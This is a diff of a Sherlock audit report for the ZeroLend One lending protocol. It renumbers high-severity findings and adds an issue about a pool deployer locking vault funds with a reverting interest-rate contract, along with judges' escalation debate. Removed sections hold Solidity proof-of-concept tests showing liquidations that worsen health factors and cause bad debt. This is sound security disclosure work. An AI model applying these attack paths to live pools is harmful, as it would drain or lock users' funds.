+> This should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+I agree that this issue meets the requirements for High severity:
+
+> Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.
+
+Due to the stale `totalAssets` data, all actions that depend on this function can result in user losses without requiring any external conditions to be met.
+
+Planning to accept the escalation and make this issue High severity.
+
+**WangSecurity**
+
+Result:
+High
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199/#issuecomment-2391738167): accepted
+
 # Issue H-5: `LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 
 
 ## Found by 
-000000, A2-security, Bigsam, Honour, dany.armstrong90, dhank, ether\_sky, imsrybr0, lemonmon, thisvishalsingh, trachev, zarkk01
+000000, A2-security, Bigsam, Honour, dhank, ether\_sky, imsrybr0, lemonmon, thisvishalsingh, trachev, zarkk01
 ### Summary
 
 `LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency, ultimately impacting regular flows (.e.g borrows, withdrawals, redemptions, ...) in the protocol for the different actors (.i.e Pools users, Curated Vaults and their users, NFT Positions users).
@@ -967,7 +1125,194 @@ index e89d626..0a48da6 100644
    }
 ```
 
-# Issue H-6: When bad debt is accumulated, the loss is not shared amongst all suppliers, instead the last to withdraw will experience a huge loss 
+# Issue H-6: Malicious pool deployer can set a malicious interest rate contract to lock funds of vault depositors 
+
+Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233 
+
+## Found by 
+A2-security, Obsidian, iamnmt
+### Summary
+
+Once vault depositors have deposited funds into a pool, a malicious pool creator can upgrade the `interestRateStrategy` contract (using `PoolConfigurator.setReserveInterestRateStrategyAddress()` to make all calls to it revert.
+
+As a result any function of the protocol that calls `updateInterestRates()` will revert because `updateInterestRates()` makes the following [call](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L160-L171):
+```solidity
+(vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)
+      .calculateInterestRates(
+      /* PARAMS */
+    );
+```
+
+The main impact is that now withdrawals will revert because `executeWithdraw()` calls `updateInterestRates()` which will always revert, so the funds that vault users deposited into this pool are lost forever.
+
+### Root Cause
+
+Allowing the pool deployer to specify any `interestRateStrategyAddress`
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+1. Vault users deposit into the pool
+2. the deployer sets their `interestRateStrategy` contract to make all calls to it revert
+3. All calls to withdraw funds from the pool will revert, the vault depositors have lost their funds
+
+### Impact
+
+All the funds deposited to the pool from the vault will be lost
+
+### PoC
+
+_No response_
+
+### Mitigation
+
+Use protocol whitelisted interest rate calculation contracts
+
+
+
+## Discussion
+
+**nevillehuang**
+
+Invalid, require malicious admin
+
+> Essentially we expect all permissioned actors to behave rationally.
+
+**iamnmt**
+
+Escalate
+
+Per the contest's `README`
+
+> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
+
+This statement makes this issue valid.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Per the contest's `README`
+> 
+> > There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
+> 
+> This statement makes this issue valid.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**zarkk01**
+
+IMO, the issue is **invalid** due to this statement of the sponsor.
+
+> Essentially we expect all permissioned actors to behave rationally.
+
+It is, absolutely, irrational for a deployer to set a malicious interest rate contract since he has **nothing** to earn out of this behaviour. 
+
+
+**0xSpearmint**
+
+The permissioned actors the protocol refers to are the protocol controlled `PoolConfigurator` and `owner` roles. They can be expected to act rationally. 
+
+This issue involves a malicious pool deployer (which can be anyone).
+
+Deploying pools is permission-less, which is why the protocol was interested in such issues as they clearly stated in the README:
+>There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
+
+**cvetanovv**
+
+I agree with the escalation of this issue to be High severity. For more information on what I think about the rule, you can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2413297520
+
+Planning to accept the escalation and make this issue High severity.
+
+**WangSecurity**
+
+Result:
+High 
+Has duplicates
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [iamnmt](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233/#issuecomment-2391294265): accepted
+
+**DemoreXTess**
+
+@cvetanovv Can we reconsider this issue per this comment : https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837_
+
+The report wrongly states that the funds are locked forever. ZeroLend has permission to make changes on the pools. Users can get back their funds after adjustment by ZeroLend
+
+**0xSpearmint**
+
+The referenced [comment ](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837)is not accurate.
+
+Even if the protocol sets a new IRM through [this only configurator function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/Pool.sol#L150-L158), the pool admin can instantly change it back to the malicious IRM using [this only pool admin function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/manager/PoolConfigurator.sol#L105-L111). 
+
+**cvetanovv**
+
+I agree with @0xSpearmint comment. Even if ZeroLend makes any changes, the malicious pool admin can immediately roll back the previous configuration.
+
+**DemoreXTess**
+
+@cvetanovv  
+Is there a problem in this one, it says escalation resolved with has duplicates but the label is not added.
+
+**cvetanovv**
+
+@DemoreXTess That's not a problem. The labels of duplicate issues will be added after all escalations are resolved.
+
+**Joshuajee**
+
+@cvetanovv and @WangSecurity ,
+
+Sorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;
+
+1. It relies on the pool deployer becoming Malicious, what are the chances?
+2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.
+3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such. 
+
+The whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.
+
+
+**cvetanovv**
+
+> @cvetanovv and @WangSecurity ,
+> 
+> Sorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;
+> 
+> 1. It relies on the pool deployer becoming Malicious, what are the chances?
+> 2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.
+> 3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such.
+> 
+> The whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.
+
+1. The pool deployer does not need to become malicious. He is malicious by default if it can hurt the Vault.
+2. I agree here, and every Vault Manager should do their own checking, but it doesn't matter because, at any time, he can change the interest rate because he is malicious.
+3. Same as point 2. They are malicious by default, and even if the vault managers do the best check, the pool manager can increase the interest rate at any time.
+
+**Joshuajee**
+
+@cvetanovv,
+
+I agree you are totally right here.
+
+I think that my earlier complaint only affects https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234
+
+Because oracles can not be changed after deployment
+
+# Issue H-7: When bad debt is accumulated, the loss is not shared amongst all suppliers, instead the last to withdraw will experience a huge loss 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275 
 
@@ -1107,7 +1452,7 @@ Ran 1 test suite in 11.14ms (4.34ms CPU time): 1 tests passed, 0 failed, 0 skipp
 
 Socialise the loss among all depositors
 
-# Issue H-7: Liquidated positions will still accrue rewards after being liquidated 
+# Issue H-8: Liquidated positions will still accrue rewards after being liquidated 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312 
 
@@ -1251,471 +1596,7 @@ The PoC shows that even though Alice was liquidated, she continued to accrue the
 
 When necessary, the liquidation function should callback to the NFT position contract to update the liquidated users position with the contract so they don't continue to accrue rewards.
 
-# Issue H-8: Liquidations do not target the lowest LTV tokens leading to a position losing health 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/335 
-
-## Found by 
-imsrybr0, joshuajee, silver\_eth, tallo
-### Summary
-
-When users liquidate a position, they are able to choose one debt asset to pay off and one asset of the users to seize for a discount. Since there are no restrictions on which collateral asset a user can seize, they can choose a high LTV asset that will often lower a positions health.
-
-### Root Cause
-
-The liquidation mechanism does not prioritize the lowest LTV assets when liquidating. Liquidators are given the ability to choose the safer higher LTV assets as collateral to seize which results in the positions health dropping.
-
-Example:
-Consider a position with collateral asset A, C and debt asset B and a 0% liquidation bonus. A is a safe asset with a liquidation LTV of 90% while C is a risky asset with a liquidation LTV of 50%. If the position has 1000 USDC of A and 1000 USDC of C then their total borrowing power is (1000*.90 + 1000*.5) = $1500 total borrowing power. If the position has a debt value greater than $1500 they will be liquidated. Consider the case where they have $1600 in debt, A positions health is calculated as:
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L141C1-L143
-
-```HealthFactor = (average liquidation LTV) * (total collateral value) / (total debt value)```
-```HealthFactor = (1000*.90+1000*.5)/(1600) = 1500/1600 = .875```
-Since ```HealthFactor < 1``` then the position is liquidatable. If the liquidator were to seize asset A to pay off $1000 of debt then the new ```HealthFactor``` is:
-```HealthFactor = (1000*.5)/(600) = 5/6 = .83333```
-Even with a 0% liquidation bonus, the positions ```HealthFactor``` decreased from .875 to .8333 after liquidation and the position is even more at risk of creating bad debt.
-
-
-### Internal pre-conditions
-
-1. User has to have a position with multiple collateral assets of varying LTV's and is borrowing an asset
-2. the user has to be liquidated
-3. the liquidator has to seize the higher LTV asset
-
-### External pre-conditions
-
-1. user collateral has to drop enough in price to be liquidatable
-2. user has to get liquidated
-
-### Attack Path
-
-1. User has a position with multiple collateral assets of varying LTV's and is borrowing an asset
-2. The positions health factor drops below 1
-3. The liquidator liquidates the position and chooses the higher LTV (safer) asset
-4. Liquidator
-
-### Impact
-
-Two main impacts:
-1. The protocol is at greater risk of bad debt and in some cases is guaranteed bad debt.
-2. The liquidator can bypass partial liquidation checks (.95 < HF < 1) by liquidating once and causing the HF to decrease below .95. The liquidator can then liquidate again to seize the rest of their collateral.
-
-### PoC
-
-Steps:
-1. set the ```PoolSetup.sol#_basicPoolInitParams``` function to the following. This is to change the LTV's/liquidation thresholds of the assets.
-```solidity
-  function _basicPoolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {
-
-    address[] memory assets = new address[](4);
-    assets[0] = address(tokenA);
-    assets[1] = address(tokenB);
-    assets[2] = address(tokenC);
-    assets[3] = address(wethToken);
-
-    address[] memory rateStrategyAddresses = new address[](4);
-    rateStrategyAddresses[0] = address(irStrategy);
-    rateStrategyAddresses[1] = address(irStrategy);
-    rateStrategyAddresses[2] = address(irStrategy);
-    rateStrategyAddresses[3] = address(irStrategy);
-
-    address[] memory sources = new address[](4);
-    sources[0] = address(oracleA);
-    sources[1] = address(oracleB);
-    sources[2] = address(oracleC);
-    sources[3] = address(oracleD);
-
-    DataTypes.InitReserveConfig memory config = _basicConfig();
-
-    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](4);
-    DataTypes.InitReserveConfig memory configA = DataTypes.InitReserveConfig({
-      ltv: 9000,
-      liquidationThreshold: 9500,
-      liquidationBonus: 10_500,
-      decimals: 18,
-      frozen: false,
-      borrowable: true,
-      borrowCap: 0,
-      supplyCap: 0
-    });
-
-    DataTypes.InitReserveConfig memory configC = DataTypes.InitReserveConfig({
-      ltv: 5000,
-      liquidationThreshold: 8000,
-      liquidationBonus: 10_500,
-      decimals: 18,
-      frozen: false,
-      borrowable: true,
-      borrowCap: 0,
-      supplyCap: 0
-    });
-    configurationLocal[0] = configA;
-    configurationLocal[1] = config;
-    configurationLocal[2] = configC;
-    configurationLocal[3] = config;
-
-    address[] memory admins = new address[](1);
-    admins[0] = address(this);
-
-    p = DataTypes.InitPoolParams({
-      proxyAdmin: address(this),
-      revokeProxy: false,
-      admins: admins,
-      emergencyAdmins: new address[](0),
-      riskAdmins: new address[](0),
-      hook: address(0),
-      assets: assets,
-      rateStrategyAddresses: rateStrategyAddresses,
-      sources: sources,
-      configurations: configurationLocal
-    });
-  }
-```
-2. place the following test inside ```NFTPositionManagerTest.t.sol```
-```solidity
-  function test_LiquidateHealthyAssetBug() public {
-    uint256 mintAmount = 100 ether;
-    uint256 supplyAmount = 1 ether;
-    uint256 tokenId = 1;
-
-    //approvals
-    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
-    _mintAndApprove(alice, tokenB, 1000 ether, address(pool)); // alice 1000 tokenB
-    _mintAndApprove(alice, tokenC, 1000 ether, address(pool)); // alice 1000 tokenC
-    _mintAndApprove(bob, tokenB, 5000 ether, address(pool)); // bob 2000 tokenB
-
-
-    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
-    INFTPositionManager.AssetOperationParams memory aliceSupplyA =
-      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 1000 ether, tokenId, data);
-    INFTPositionManager.AssetOperationParams memory aliceSupplyC =
-      INFTPositionManager.AssetOperationParams(address(tokenC), alice, 1000 ether, tokenId, data);
-    INFTPositionManager.AssetOperationParams memory aliceBorrowB =
-      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 1390 ether, tokenId, data);
-    INFTPositionManager.AssetOperationParams memory bobSupplyB =
-      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 2000 ether, 2, data);
-    oracleA.updateAnswer(1e8);
-    oracleB.updateAnswer(1e8);
-    oracleC.updateAnswer(1e8);
-
-    vm.startPrank(alice);
-    tokenA.approve(address(nftPositionManager), 100000 ether);
-    tokenB.approve(address(nftPositionManager), 100000 ether);
-    tokenC.approve(address(nftPositionManager), 100000 ether);
-    nftPositionManager.mint(address(pool));
-    nftPositionManager.supply(aliceSupplyA);
-    nftPositionManager.supply(aliceSupplyC);
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    tokenA.approve(address(pool), 100000 ether);
-    tokenB.approve(address(pool), 100000 ether);
-    tokenC.approve(address(pool), 100000 ether);
-    tokenA.approve(address(nftPositionManager), 100000 ether);
-    tokenB.approve(address(nftPositionManager), 100000 ether);
-    tokenC.approve(address(nftPositionManager), 100000 ether);
-    nftPositionManager.mint(address(pool));
-    nftPositionManager.supply(bobSupplyB);
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    nftPositionManager.borrow(aliceBorrowB);
-    vm.stopPrank();
-
-    oracleC.updateAnswer(5000e4);
-    (,,,,uint256 currentLTV,uint256 healthFactorBefore) = pool.getUserAccountData(address(nftPositionManager), 1);
-    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
-    console.log("\n========================\n");
-    console.log("alice HF before liquidation: %e", healthFactorBefore);
-    console.log("alice LTV before liquidation: %e\n", currentLTV);
-
-    console.log("Liquidating...");
-    vm.startPrank(bob);
-    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
-
-    (,,,,uint256 afterLTV,uint256 healthFactorAfter) = pool.getUserAccountData(address(nftPositionManager), 1);
-    console.log("\nalice HF after liquidation: %e", healthFactorAfter);
-    console.log("alice LTV after liquidation: %e", afterLTV);
-    vm.stopPrank();
-  }
-```
-
-#### Output
-  alice HF before liquidation: 9.71223021582733813e17
-  alice LTV before liquidation: 7.666e3
-
-  Liquidating...
-
-  alice HF after liquidation: 9.44913884892086331e17
-  alice LTV after liquidation: 6.403e3
-
-The PoC shows a decrease in HF from .971 to .944 along with a decrease in LTV.
-
-### Mitigation
-
-Liquidation should prioritize the lowest LTV/riskiest assets first.
-
-# Issue H-9: Partial liquidations can sometimes lower a positions health and lead to guaranteed bad debt 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/338 
-
-## Found by 
-coffiasd, joshuajee, tallo, trachev
-### Summary
-
-Partial liquidations are allowed when a users healthFactor ```.95 < healthFactor < 1```. When users have a single asset as collateral this often leads to a position having a decreased health factor after liquidation. The user can be repeatedly liquidated and the protocol guaranteed bad debt.
-
-### Root Cause
-The cases where a position's health factor decreases can be derived as follows:
-Partial liquidation percent: 50%
-Liquidator discount K: 5%
-C: initial collateral value
-D: initial debt value
-LT: Liquidation threshold
-Initial Health factor = (C * LT) / D < 1
-After partial Liquidation:
-New Debt: D' = D * 0.5
-Liquidated Collateral: L = (D * 0.5)/(1 - K)
-New Collateral: C' = C-L
-New Health Factor = (C' * LT)/D'
-For the health factor to increase the following inequality must hold:
-(C' * LT) / D' > (C * LT) / D
-(C - L)  > C * 0.5
- (C - (D * 0.5)/(1 - K) > C * 0.5
--(D * 0.5 / (1 -  K)) > -C * 0.5
-D * 0.5 / (1 - K) < C * 0.5
-D / (1 - K) < C
-(1 - K ) > D / C
-C / D > 1 / (1 - K) 
-In other words, liquidation only leads to an increase in the health factor when there is enough collateral to pay off the discount. This inequality is more likely to be unsatisfied with higher LTV assets since the C / D value will be lower.
-
-### Internal pre-conditions
-1. User must be liquidatable (HF < 1)
-2. If the following inequality doesn't hold, then the liquidation will cause a decrease in health factor.
-C / D > 1 / (1 - K) 
-
-### External pre-conditions
-
-1. A users collateral must drop in price sufficiently for them to be liquidatable
-
-### Attack Path
-
-1. User position health factor drops below 1
-2. User gets partially liquidated
-3. Liquidation decreases the health factor
-4. Liquidation is repeated until all collateral drained and only bad debt remains
-
-### Impact
-
-1. A position will end up less healthy after liquidation than before. This will lead to repeated liquidations and guaranteed accrual of bad debt for the protocol. This issue is more prevalent in higher LTV (safer) assets since the C / D ratio will be lower.
-2. The partial liquidation mechanism can be bypassed since the liquidation mechanisms intention is to increase a positions HF beyond 1. However, this doesn't happen in this edge case so a previously liquidated position can still be liquidatable and can be repeatedly liquidated. Essentially bypassing the following close factor limitations:
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L266C1-L267C1
-```solidity    
-uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;
-```
-### PoC
-1. set the PoolSetup.sol#_basicPoolInitParams function to the following. This is to change the LTV's/liquidation thresholds of the assets.
-```solidity
-  function _basicPoolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {
-
-    address[] memory assets = new address[](4);
-    assets[0] = address(tokenA);
-    assets[1] = address(tokenB);
-    assets[2] = address(tokenC);
-    assets[3] = address(wethToken);
-
-    address[] memory rateStrategyAddresses = new address[](4);
-    rateStrategyAddresses[0] = address(irStrategy);
-    rateStrategyAddresses[1] = address(irStrategy);
-    rateStrategyAddresses[2] = address(irStrategy);
-    rateStrategyAddresses[3] = address(irStrategy);
-
-    address[] memory sources = new address[](4);
-    sources[0] = address(oracleA);
-    sources[1] = address(oracleB);
-    sources[2] = address(oracleC);
-    sources[3] = address(oracleD);
-
-    DataTypes.InitReserveConfig memory config = _basicConfig();
-
-    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](4);
-    DataTypes.InitReserveConfig memory configA = DataTypes.InitReserveConfig({
-      ltv: 9000,
-      liquidationThreshold: 9500,
-      liquidationBonus: 10_500,
-      decimals: 18,
-      frozen: false,
-      borrowable: true,
-      borrowCap: 0,
-      supplyCap: 0
-    });
-
-    DataTypes.InitReserveConfig memory configC = DataTypes.InitReserveConfig({
-      ltv: 5000,
-      liquidationThreshold: 8000,
-      liquidationBonus: 10_500,
-      decimals: 18,
-      frozen: false,
-      borrowable: true,
-      borrowCap: 0,
-      supplyCap: 0
-    });
-    configurationLocal[0] = configA;
-    configurationLocal[1] = config;
-    configurationLocal[2] = configC;
-    configurationLocal[3] = config;
-
-    address[] memory admins = new address[](1);
-    admins[0] = address(this);
-
-    p = DataTypes.InitPoolParams({
-      proxyAdmin: address(this),
-      revokeProxy: false,
-      admins: admins,
-      emergencyAdmins: new address[](0),
-      riskAdmins: new address[](0),
-      hook: address(0),
-      assets: assets,
-      rateStrategyAddresses: rateStrategyAddresses,
-      sources: sources,
-      configurations: configurationLocal
-    });
-  }
-```
-2. place the following test inside NFTPositionManagerTest.t.sol
-```solidity
-  function test_doubleLiquidateBug() public {
-    uint256 mintAmount = 100 ether;
-    uint256 supplyAmount = 1 ether;
-    uint256 tokenId = 1;
-
-    //approvals
-    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
-    _mintAndApprove(alice, tokenB, 1000 ether, address(pool)); // alice 1000 tokenB
-    _mintAndApprove(alice, tokenC, 1000 ether, address(pool)); // alice 1000 tokenC
-    _mintAndApprove(bob, tokenB, 5000 ether, address(pool)); // bob 2000 tokenB
-
-
-    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
-    INFTPositionManager.AssetOperationParams memory aliceSupplyA =
-      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 1000 ether, tokenId, data);
-    INFTPositionManager.AssetOperationParams memory aliceBorrowB =
-      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 750 ether, tokenId, data);
-    INFTPositionManager.AssetOperationParams memory bobSupplyB =
-      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 2000 ether, 2, data);
-    oracleA.updateAnswer(1e8);
-    oracleB.updateAnswer(1e8);
-
-    vm.startPrank(alice);
-    tokenA.approve(address(nftPositionManager), 100000 ether);
-    tokenB.approve(address(nftPositionManager), 100000 ether);
-    tokenC.approve(address(nftPositionManager), 100000 ether);
-    nftPositionManager.mint(address(pool));
-    nftPositionManager.supply(aliceSupplyA);
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    tokenA.approve(address(pool), 100000 ether);
-    tokenB.approve(address(pool), 100000 ether);
-    tokenC.approve(address(pool), 100000 ether);
-    tokenA.approve(address(nftPositionManager), 100000 ether);
-    tokenB.approve(address(nftPositionManager), 100000 ether);
-    tokenC.approve(address(nftPositionManager), 100000 ether);
-    nftPositionManager.mint(address(pool));
-    nftPositionManager.supply(bobSupplyB);
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    nftPositionManager.borrow(aliceBorrowB);
-    vm.stopPrank();
-
-    uint256 balanceBefore = tokenA.balanceOf(bob);
-    oracleA.updateAnswer(7800e4);
-
-    (uint256 collBeforeAnyLiquidation,uint256 debtBeforeAnyLiquidation,,,,uint256 healthFactorBeforeAnyLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
-    uint256 ratioBeforeAnyLiquidation = debtBeforeAnyLiquidation*1e18/collBeforeAnyLiquidation;
-    console.log("d / c < .95 => %e / %e = %e", debtBeforeAnyLiquidation,collBeforeAnyLiquidation, ratioBeforeAnyLiquidation);
-    console.log("ratio < 0.95 => %e < %e => %s", ratioBeforeAnyLiquidation, 0.95e18, ratioBeforeAnyLiquidation < 0.95e18);
-
-    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
-    console.log("alice HF before any liquidations: %e\n", healthFactorBeforeAnyLiquidation);
-
-
-    vm.startPrank(bob);
-    //stack too deep prevention
-    {
-            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
-            uint256 balanceAfterFirstLiquidation = tokenA.balanceOf(bob);
-            (uint256 collAfterFirstLiquidation,uint256 debtAfterFirstLiquidation,,,,uint256 healthFactorAfterFirstLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
-            uint256 ratioAfterFirstLiquidation = debtAfterFirstLiquidation*1e18/collAfterFirstLiquidation;
-            console.log("bad debt: %s", collAfterFirstLiquidation < debtAfterFirstLiquidation);
-            console.log("d / c < .95 => %e / %e = %e", debtAfterFirstLiquidation,collAfterFirstLiquidation, ratioAfterFirstLiquidation);
-            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterFirstLiquidation, 0.95e18, ratioAfterFirstLiquidation < 0.95e18);
-
-            console.log("alice HF after first liquidation: %e", healthFactorAfterFirstLiquidation);
-            console.log("Total amount liquidated: %e\n", balanceAfterFirstLiquidation-balanceBefore);
-    }
-
-    {
-            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
-            uint256 balanceAfterSecondLiquidation = tokenA.balanceOf(bob);
-            (uint256 collAfterSecondLiquidation,uint256 debtAfterSecondLiquidation,,,,uint256 healthFactorAfterSecondLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
-            uint256 ratioAfterSecondLiquidation = debtAfterSecondLiquidation*1e18/collAfterSecondLiquidation;
-            console.log("bad debt: %s", collAfterSecondLiquidation < debtAfterSecondLiquidation);
-            console.log("d / c < .95 => %e / %e = %e", debtAfterSecondLiquidation,collAfterSecondLiquidation, ratioAfterSecondLiquidation);
-            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterSecondLiquidation, 0.95e18, ratioAfterSecondLiquidation < 0.95e18);
-
-            console.log("alice HF after second liquidation: %e", healthFactorAfterSecondLiquidation);
-            console.log("Total amount liquidated: %e\n", balanceAfterSecondLiquidation-balanceBefore);
-     }
-
-    {
-            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
-            uint256 balanceAfterThirdLiquidation = tokenA.balanceOf(bob);
-            (uint256 collAfterThirdLiquidation,uint256 debtAfterThirdLiquidation,,,,uint256 healthFactorAfterThirdLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
-            uint256 ratioAfterThirdLiquidation = debtAfterThirdLiquidation*1e18/collAfterThirdLiquidation;
-            console.log("bad debt: %s", collAfterThirdLiquidation < debtAfterThirdLiquidation);
-            console.log("d / c < .95 => %e / %e = %e", debtAfterThirdLiquidation,collAfterThirdLiquidation, ratioAfterThirdLiquidation);
-            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterThirdLiquidation, 0.95e18, ratioAfterThirdLiquidation < 0.95e18);
-
-            console.log("alice HF after second liquidation: %e", healthFactorAfterThirdLiquidation);
-            console.log("Total amount liquidated: %e\n", balanceAfterThirdLiquidation-balanceBefore);
-    }
-    vm.stopPrank();
-  }
-```
-
-Logs: 
-  d / c < .95 => 7.5e10 / 7.8e10 = 9.61538461538461538e17
-  ratio < 0.95 => 9.61538461538461538e17 < 9.5e17 => false
-  alice HF before any liquidations: 9.88e17
-
-  bad debt: false
-  d / c < .95 => 3.75e10 / 3.8625e10 = 9.7087378640776699e17
-  ratio < 0.95 => 9.7087378640776699e17 < 9.5e17 => false
-  alice HF after first liquidation: 9.785e17
-  Total amount liquidated: 5.04807692307692307692e20
-
-  bad debt: false
-  d / c < .95 => 1.875e10 / 1.89375e10 = 9.90099009900990099e17
-  ratio < 0.95 => 9.90099009900990099e17 < 9.5e17 => false
-  alice HF after second liquidation: 9.595e17
-  Total amount liquidated: 7.57211538461538461538e20
-
-  bad debt: true
-  d / c < .95 => 9.375e9 / 9.09375e9 = 1.030927835051546391e18
-  ratio < 0.95 => 1.030927835051546391e18 < 9.5e17 => false
-  alice HF after second liquidation: 9.215e17
-  Total amount liquidated: 8.8341346153846153846e20
-
-The test shows how after subsequent liquidations, the health factor fails to improve after several liquidations. The position is both unhealthier after each liquidation, and the user is being liquidated beyond 50% of their debt when their ```HF > 0.95```. Eventually, after the 3rd liquidation the protocol is left with bad debt (collateral < debt)
- 
-### Mitigation
-
-Do not allow partial liquidations when the inequality is unfavorable. Consider disallowing liquidations if they decrease the health factor.
-
-# Issue H-10: Function `executeMintToTreasury` will incorrectly reduce the `supplyShares`, therefore prevent the last users  from withdrawing 
+# Issue H-9: Function `executeMintToTreasury` will incorrectly reduce the `supplyShares`, therefore prevent the last users  from withdrawing 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375 
 
@@ -1795,12 +1676,12 @@ Suggestion of mitigation:
 ```
 
 
-# Issue H-11: Interest rate is updated before updating the debt when repaying debt 
+# Issue H-10: Interest rate is updated before updating the debt when repaying debt 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413 
 
 ## Found by 
-000000, 0xweebad, A2-security, JCN, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, dhank, ether\_sky, imsrybr0, lemonmon, stuart\_the\_minion, trachev
+000000, 0xweebad, A2-security, JCN, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, ether\_sky, imsrybr0, lemonmon, stuart\_the\_minion, trachev
 ### Summary
 
 Interest rate is updated before updating the debt when repaying debt in `BorrowLogic@executeRepay` leading to an incorrect total debt being used when calculating the new interest rates and causing suppliers to keep accruing interest based on the previous debt and even if there are no ongoing borrows anymore.
@@ -2003,12 +1884,12 @@ index 92806b1..c070fb1 100644
    }
 ```
 
-# Issue H-12: Wrong calculation of supply/debt balance of a position, disrupting core system functionalities 
+# Issue H-11: Wrong calculation of supply/debt balance of a position, disrupting core system functionalities 
 
